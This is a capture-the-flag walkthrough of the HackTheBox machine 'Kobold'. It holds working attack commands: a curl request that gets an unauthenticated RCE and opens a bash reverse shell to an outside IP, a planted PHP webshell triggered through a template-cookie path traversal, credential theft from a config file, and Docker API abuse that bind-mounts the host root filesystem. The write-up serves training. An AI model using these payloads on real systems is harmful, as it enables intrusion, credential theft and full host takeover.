# Machine: Kobold

Date: 31-05-2026
Platform: HTB
Difficulty: Easy
Author: WhoKn0ws

---

## Recon

### Nmap:

```bash
nmap -sC -sV $MACHINE_IP
```

**Results:**

- Port 22 → SSH (OpenSSH 9.6p1, Ubuntu)
- Port 80 → HTTP (nginx) — redirects to HTTPS
- Port 443 → HTTPS (nginx + TLS) — `kobold.htb`, wildcard cert `*.kobold.htb`
- Port 3552 → Arcane (Docker management UI, bound to all interfaces)

**Full port scan:**

Not documented separately — standard scan covered all relevant ports including 3552.

**Notes:**

- Wildcard SSL cert (`*.kobold.htb`) signals subdomain enumeration is needed
- Added to /etc/hosts: `$MACHINE_IP kobold.htb mcp.kobold.htb bin.kobold.htb`

---

## Enumeration

### Vhost fuzzing:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u https://kobold.htb/ -H "Host: FUZZ.kobold.htb" -ac
```

**Findings:**

- `mcp.kobold.htb` — MCPJam Inspector (MCP server management UI), version ≤ 1.4.2
- `bin.kobold.htb` — PrivateBin 2.0.2

### Vulnerability identification:

- MCPJam Inspector ≤ 1.4.2 → matches **CVE-2026-23744** (unauthenticated RCE)
- PrivateBin 2.0.2 → matches **CVE-2025-64714** (template cookie LFI)

---

## Exploitation

### CVE-2026-23744 — MCPJam Inspector unauthenticated RCE

MCPJam Inspector ≤ 1.4.2 binds its API to all interfaces and does not authenticate `POST /api/mcp/connect`, which executes the `serverConfig.command` / `args` fields directly.

**Steps:**

**1. Set up listener:**

```bash
rlwrap nc -lvnp 4444
```

**2. Trigger the unauthenticated RCE:**

```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -H "Host: mcp.kobold.htb" \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/10.10.14.212/4444 0>&1"],"env":{}},"serverId":"pwn"}'
```

**Result:** Reverse shell as `ben` (`uid=1001`, groups: `ben`, `operator`).

---

## Privilege Escalation

### Enumeration — ben to root:

`ben`'s `operator` group membership grants write access to `/privatebin-data/data/`, which is reachable through a PrivateBin LFI bug — not through `docker` group membership, since `ben` isn't in that group.

**Findings:**

- `templateselection = true` is set in PrivateBin's `/srv/cfg/conf.php`
- The `template` cookie value is used to include a PHP file relative to `tpl/`, allowing path traversal to attacker-controlled PHP dropped in `/privatebin-data/data/` — this is CVE-2025-64714

### CVE-2025-64714 — PrivateBin template cookie LFI → webshell:

**1. Drop a PHP webshell into the writable data directory (as `ben`):**

```bash
echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
```

**2. Trigger it via the template cookie traversal:**

```bash
curl -sk "https://bin.kobold.htb/?cmd=id" \
  -H "Host: bin.kobold.htb" \
  -H "Cookie: template=../data/shell"
```

**Result:** RCE confirmed via the webshell.

**3. Read PrivateBin's config for reusable credentials:**

```bash
curl -sk "https://bin.kobold.htb/?cmd=cat+/srv/cfg/conf.php" \
  -H "Host: bin.kobold.htb" \
  -H "Cookie: template=../data/shell" | grep -E 'usr|pwd|dsn'
```

**Result:** Leaked DB credentials — `usr: privatebin`, `pwd: ComplexP@sswordAdmin1928`.

### Arcane Docker management — authenticated container abuse:

Arcane (port 3552) runs as root with access to the local Docker daemon. The leaked DB password is reused for the Arcane admin account `arcane`.

```bash
curl -sk http://$MACHINE_IP:3552/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"arcane","password":"ComplexP@sswordAdmin1928"}'
```

Using the returned JWT, create a container from a locally-cached image (no outbound registry access on this box) with the host root filesystem bind-mounted:

```bash
TOKEN="<jwt>"

curl -sk http://$MACHINE_IP:3552/api/environments/0/containers \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "rootread",
    "image": "privatebin/nginx-fpm-alpine:2.0.2",
    "user": "root",
    "entrypoint": ["cat"],
    "cmd": ["/hostfs/root/root.txt"],
    "hostConfig": {"binds": ["/:/hostfs:ro"], "autoRemove": true}
  }'
```

> Alternative if the API response isn't directly visible: write the flag out to a path readable via the PrivateBin webshell instead (mount `rw`, write to `/hostfs/privatebin-data/data/rootflag.txt`, then read it back through the webshell).

**Successful escalation:** root ✓ — container created with the host filesystem mounted, root flag read directly.

---

## Loot / Flags

- **user.txt:** `[FLAG REDACTED]` → `/home/ben/user.txt`
- **root.txt:** `[FLAG REDACTED]` → `/root/root.txt`

---

## Lessons Learned

- MCPJam's `/api/mcp/connect` endpoint requires no credentials at all — confirm exploitability fast with a simple `id` one-liner before setting up a full reverse shell listener chain
- Group membership matters for picking the right privesc path — check `/etc/group` carefully; `ben` was in `operator`, not `docker`, so the path went through Arcane's own API rather than direct Docker socket abuse
- When a box has no outbound registry access, check for locally-cached Docker images (`docker images` if you get that far, or infer from what's already deployed) — reuse what's already present rather than assuming you need to pull anything
- Config files (`conf.php`, etc.) reached via LFI/RCE bugs are worth grep-ing immediately for credentials — they're frequently reused across unrelated services on the same box (here, PrivateBin's DB password unlocked the Arcane admin panel)
- Template/cookie-based file inclusion bugs (`template=../data/shell`) are a reminder to always test path traversal in any user-controlled value that selects a template or file, even when it looks like an internal-only setting
